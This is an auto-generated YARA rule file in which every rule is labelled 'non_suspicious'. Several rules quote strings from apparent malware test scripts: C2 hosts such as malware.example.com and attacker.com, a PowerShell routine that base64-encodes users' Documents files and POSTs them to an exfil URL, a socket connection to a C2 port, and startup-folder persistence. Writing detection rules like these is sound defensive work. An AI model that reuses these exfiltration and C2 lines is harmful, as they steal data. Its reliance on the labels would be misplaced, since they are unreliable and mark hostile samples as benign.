/* Auto-generated from dashboard labels */

rule non_suspicious_FolderAnalyzer_vbs
{
    meta:
        source_file = "FolderAnalyzer.vbs"
        label = "non_suspicious"
        sha256 = "808c753777371f2d16832622f2452f617305d77400eb5b4c7f0b8ac5c407a498"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" nocase
        $s2 = "Function GetFolderSize(path)" nocase
        $s3 = "Dim folder, file, total" nocase
        $s4 = "total = 0" nocase
        $s5 = "Set folder = objFSO.GetFolder(path)" nocase
        $s6 = "For Each file In folder.Files" nocase
        $s7 = "total = total + file.Size" nocase
        $s8 = "Next" nocase
        $s9 = "GetFolderSize = total" nocase
        $s10 = "End Function" nocase
        $s11 = "Function GetFileCount(path)" nocase
        $s12 = "Dim folder" nocase
    condition:
        all of them
}
rule non_suspicious_Generator_vbs
{
    meta:
        source_file = "Generator.vbs"
        label = "non_suspicious"
        sha256 = "d216328a2781db7af1af5be3a742fcbb532b261453db1d384b06ef9982d81f9f"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "Randomize" nocase
        $s2 = "Function GenerateNumber()" nocase
        $s3 = "GenerateNumber = Int((100 * Rnd) + 1)" nocase
        $s4 = "End Function" nocase
        $s5 = "Sub PrintNumbers()" nocase
        $s6 = "Dim i" nocase
        $s7 = "For i = 1 To 15" nocase
        $s8 = "WScript.Echo \"Number: \" & GenerateNumber()" nocase
        $s9 = "Next" nocase
        $s10 = "End Sub" nocase
        $s11 = "Sub RunCycle()" nocase
        $s12 = "PrintNumbers()" nocase
    condition:
        all of them
}
rule non_suspicious_Logger_vbs
{
    meta:
        source_file = "Logger.vbs"
        label = "non_suspicious"
        sha256 = "21d42e614fd9e7b783b90df559c1dbeb0f1a0a3013fbd656bfd69763c8149929"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" nocase
        $s2 = "logFile = \"app_log.txt\"" nocase
        $s3 = "Function GetTimestamp()" nocase
        $s4 = "GetTimestamp = Now" nocase
        $s5 = "End Function" nocase
        $s6 = "Sub WriteLog(msg)" nocase
        $s7 = "Dim f" nocase
        $s8 = "Set f = objFSO.OpenTextFile(logFile, 8, True)" nocase
        $s9 = "f.WriteLine GetTimestamp() & \" - \" & msg" nocase
        $s10 = "f.Close" nocase
        $s11 = "End Sub" nocase
        $s12 = "Sub RunLogger()" nocase
    condition:
        all of them
}
rule non_suspicious_MenuSystem_vbs
{
    meta:
        source_file = "MenuSystem.vbs"
        label = "non_suspicious"
        sha256 = "d271dda4fc99e20dfff98fe30edb41a0306100c77444636865820c56604545f4"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "Function ShowMenu()" nocase
        $s2 = "WScript.Echo \"1. Option A\"" nocase
        $s3 = "WScript.Echo \"2. Option B\"" nocase
        $s4 = "WScript.Echo \"3. Exit\"" nocase
        $s5 = "End Function" nocase
        $s6 = "Sub HandleOption(opt)" nocase
        $s7 = "If opt = 1 Then" nocase
        $s8 = "WScript.Echo \"Selected A\"" nocase
        $s9 = "ElseIf opt = 2 Then" nocase
        $s10 = "WScript.Echo \"Selected B\"" nocase
        $s11 = "Else" nocase
        $s12 = "WScript.Echo \"Exit\"" nocase
    condition:
        all of them
}
rule non_suspicious_SimulationEngine_py
{
    meta:
        source_file = "SimulationEngine.py"
        label = "non_suspicious"
        sha256 = "ce960d1541e4dcc78656de579188ae75dd68c80664528bcec25c22ce20f7f196"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "import random,time" nocase
        $s2 = "def generate():" nocase
        $s3 = "data=[]" nocase
        $s4 = "for _ in range(20):" nocase
        $s5 = "data.append(random.randint(1,100))" nocase
        $s6 = "return data" nocase
        $s7 = "def analyze(d):" nocase
        $s8 = "print(\"Max:\",max(d))" nocase
        $s9 = "print(\"Min:\",min(d))" nocase
        $s10 = "print(\"Avg:\",sum(d)/len(d))" nocase
        $s11 = "def loop():" nocase
        $s12 = "while True:" nocase
    condition:
        all of them
}
rule non_suspicious_SystemUtility_py
{
    meta:
        source_file = "SystemUtility.py"
        label = "non_suspicious"
        sha256 = "218717068abaf8749efcc4e7433df33a06052e144450d6b3db546e7ffd305ab0"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "import os,time,platform" nocase
        $s2 = "def get_user():" nocase
        $s3 = "return os.getenv(\"USER\")" nocase
        $s4 = "def get_host():" nocase
        $s5 = "return platform.node()" nocase
        $s6 = "def get_cwd():" nocase
        $s7 = "return os.getcwd()" nocase
        $s8 = "def get_time():" nocase
        $s9 = "return time.ctime()" nocase
        $s10 = "def display():" nocase
        $s11 = "print(\"User:\",get_user())" nocase
        $s12 = "print(\"Host:\",get_host())" nocase
    condition:
        all of them
}
rule non_suspicious_UserInfo_vbs
{
    meta:
        source_file = "UserInfo.vbs"
        label = "non_suspicious"
        sha256 = "7e7d1e037ef3472acb5475481e32721acb15f8fe097f7c21b49fe12f92e39d0c"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "Set objShell = CreateObject(\"WScript.Shell\")" nocase
        $s2 = "Function GetUser()" nocase
        $s3 = "GetUser = objShell.ExpandEnvironmentStrings(\"%USERNAME%\")" nocase
        $s4 = "End Function" nocase
        $s5 = "Function GetPath()" nocase
        $s6 = "GetPath = objShell.CurrentDirectory" nocase
        $s7 = "Sub Display()" nocase
        $s8 = "WScript.Echo \"User: \" & GetUser()" nocase
        $s9 = "WScript.Echo \"Path: \" & GetPath()" nocase
        $s10 = "End Sub" nocase
        $s11 = "Sub Run()" nocase
        $s12 = "Dim i" nocase
    condition:
        all of them
}
rule non_suspicious_cod_py
{
    meta:
        source_file = "cod.py"
        label = "non_suspicious"
        sha256 = "e89ab1614691136682d869f9c921d75a86e5185963b58a5422b804a5daf18c81"
        updated_at = "2026-03-22 18:16:27 UTC"
    strings:
        $s1 = "import time" nocase
        $s2 = "texts=[\"alpha\",\"beta\",\"gamma\",\"delta\",\"epsilon\"]" nocase
        $s3 = "def upper(t):" nocase
        $s4 = "return t.upper()" nocase
        $s5 = "def lower(t):" nocase
        $s6 = "return t.lower()" nocase
        $s7 = "def reverse(t):" nocase
        $s8 = "return t[::-1]" nocase
        $s9 = "def process_one(t):" nocase
        $s10 = "print(\"Original:\",t)" nocase
        $s11 = "print(\"Upper:\",upper(t))" nocase
        $s12 = "print(\"Lower:\",lower(t))" nocase
    condition:
        all of them
}
rule non_suspicious_performanceAnalyzer_py
{
    meta:
        source_file = "performanceAnalyzer.py"
        label = "non_suspicious"
        sha256 = "ae0f1343e7ca40b72b9ac90acb38b9828e2638f1398b317e9688a8cb49df200d"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "import os,time,platform" nocase
        $s2 = "def get_user():" nocase
        $s3 = "return os.getenv(\"USER\")" nocase
        $s4 = "def get_host():" nocase
        $s5 = "return platform.node()" nocase
        $s6 = "def get_platform():" nocase
        $s7 = "return platform.system()" nocase
        $s8 = "def get_version():" nocase
        $s9 = "return platform.version()" nocase
        $s10 = "def get_cwd():" nocase
        $s11 = "return os.getcwd()" nocase
        $s12 = "def get_time():" nocase
    condition:
        all of them
}
rule non_suspicious_sup_ps1
{
    meta:
        source_file = "sup.ps1"
        label = "non_suspicious"
        sha256 = "fb44346ac929f1cb509f6f0d827fafd93242dceb9cfef69dd19ff831c805a00f"
        updated_at = "2026-03-22 18:15:54 UTC"
    strings:
        $s1 = "$C2Server = \"malware.example.com\"" nocase
        $s2 = "$C2Port = 8080" nocase
        $s3 = "function Get-SystemInfo {" nocase
        $s4 = "$sysinfo = @{}" nocase
        $s5 = "$sysinfo[\"ComputerName\"] = $env:COMPUTERNAME" nocase
        $s6 = "$sysinfo[\"Username\"] = $env:USERNAME" nocase
        $s7 = "$sysinfo[\"OSVersion\"] = (Get-WmiObject Win32_OperatingSystem).Version" nocase
        $s8 = "$sysinfo[\"ProcessorCount\"] = (Get-WmiObject Win32_ComputerSystem).NumberOfProcessors" nocase
        $s9 = "return $sysinfo" nocase
        $s10 = "function Invoke-WebRequest-Obfuscated {" nocase
        $s11 = "$url = \"http://$C2Server:$C2Port/beacon\"" nocase
        $s12 = "$data = Get-SystemInfo | ConvertTo-Json" nocase
    condition:
        all of them
}
rule non_suspicious_sus2_vbs
{
    meta:
        source_file = "sus2.vbs"
        label = "non_suspicious"
        sha256 = "ec6165d694d78fddfe1995deacab395ac19eeab8402bb1c4bc3f712e6f0f8b12"
        updated_at = "2026-03-22 18:16:02 UTC"
    strings:
        $s1 = "Set objShell = CreateObject(\"WScript.Shell\")" nocase
        $s2 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" nocase
        $s3 = "C2_HOST = \"example-test-domain.com\"" nocase
        $s4 = "C2_PORT = 443" nocase
        $s5 = "Sub SimulateBeacon()" nocase
        $s6 = "WScript.Echo \"Simulating network beacon to https://\" & C2_HOST & \":\" & C2_PORT & \"/beacon\"" nocase
        $s7 = "End Sub" nocase
        $s8 = "Sub SimulatePersistence()" nocase
        $s9 = "startup_folder = objShell.SpecialFolders(\"Startup\")" nocase
        $s10 = "test_file = startup_folder & \"\\TestSimulation.txt\"" nocase
        $s11 = "Set f = objFSO.CreateTextFile(test_file, True)" nocase
        $s12 = "f.WriteLine \"Persistence simulation\"" nocase
    condition:
        all of them
}
rule non_suspicious_susps_ps1
{
    meta:
        source_file = "susps.ps1"
        label = "non_suspicious"
        sha256 = "afdf9e21097f436ff54a8ca0227a7d1d50a3ce716e3fc84ac9e46f692629bc16"
        updated_at = "2026-03-22 18:15:54 UTC"
    strings:
        $s1 = "$C2Server = \"malware.example.com\"" nocase
        $s2 = "$C2Port = 8080" nocase
        $s3 = "function Exfiltrate-Data {" nocase
        $s4 = "$sensitive_files = Get-ChildItem -Path \"C:\\Users\\*\\Documents\" -Recurse -Include \"*.pdf\", \"*.docx\", \"*.xlsx\"" nocase
        $s5 = "foreach ($file in $sensitive_files) {" nocase
        $s6 = "$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))" nocase
        $s7 = "$exfil_url = \"http://$C2Server/exfil?file=$($file.Name)\"" nocase
        $s8 = "try {" nocase
        $s9 = "Invoke-WebRequest -Uri $exfil_url -Method POST -Body $content -UseBasicParsing" nocase
        $s10 = "} catch {" nocase
        $s11 = "continue" nocase
        $s12 = "}" nocase
    condition:
        all of them
}
rule non_suspicious_suspy_py
{
    meta:
        source_file = "suspy.py"
        label = "non_suspicious"
        sha256 = "1528c83b41bd42e28b8b8d9ec7e6d3ce40e24ab13ae94f3c0dc40bdc4809da7c"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "import subprocess" nocase
        $s2 = "import os" nocase
        $s3 = "import socket" nocase
        $s4 = "import base64" nocase
        $s5 = "def establish_c2_connection():" nocase
        $s6 = "\"\"\"Establish connection to command and control server\"\"\"" nocase
        $s7 = "host = \"192.168.1.100\"" nocase
        $s8 = "port = 4444" nocase
        $s9 = "try:" nocase
        $s10 = "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" nocase
        $s11 = "sock.connect((host, port))" nocase
        $s12 = "return sock" nocase
    condition:
        all of them
}
rule non_suspicious_susvbs_vbs
{
    meta:
        source_file = "susvbs.vbs"
        label = "non_suspicious"
        sha256 = "92bd3498cc4daa289c3ff16e1d8b646a8bd2052f1e926b7c833dc81bf406737e"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "' Suspicious VBScript for testing YARA rules" nocase
        $s2 = "Set objWMI = GetObject(\"winmgmts:\")" nocase
        $s3 = "Set objShell = CreateObject(\"WScript.Shell\")" nocase
        $s4 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" nocase
        $s5 = "' C2 Configuration" nocase
        $s6 = "C2_HOST = \"attacker.com\"" nocase
        $s7 = "C2_PORT = 443" nocase
        $s8 = "Sub InitializeBeacon()" nocase
        $s9 = "Dim xmlHttp" nocase
        $s10 = "Set xmlHttp = CreateObject(\"MSXML2.XMLHTTP\")" nocase
        $s11 = "Dim sysInfo" nocase
        $s12 = "sysInfo = \"computer=\" & objShell.ExpandEnvironmentStrings(\"%COMPUTERNAME%\") & \"&user=\" & objShell.ExpandEnvironmentS" nocase
    condition:
        all of them
}
rule non_suspicious_timer_py
{
    meta:
        source_file = "timer.py"
        label = "non_suspicious"
        sha256 = "d9aecd9187f7c0627136f08e60e6d848465f540f717414e8ae65fc3b07d64037"
        updated_at = "2026-03-22 18:14:35 UTC"
    strings:
        $s1 = "import random,time" nocase
        $s2 = "def generate():" nocase
        $s3 = "return [random.randint(1,100) for _ in range(25)]" nocase
        $s4 = "def analyze(d):" nocase
        $s5 = "total=sum(d)" nocase
        $s6 = "avg=total/len(d)" nocase
        $s7 = "print(\"Total:\",total)" nocase
        $s8 = "print(\"Avg:\",avg)" nocase
        $s9 = "def sort_data(d):" nocase
        $s10 = "return sorted(d)" nocase
        $s11 = "def display(d):" nocase
        $s12 = "for x in d[:10]:" nocase
    condition:
        all of them
}
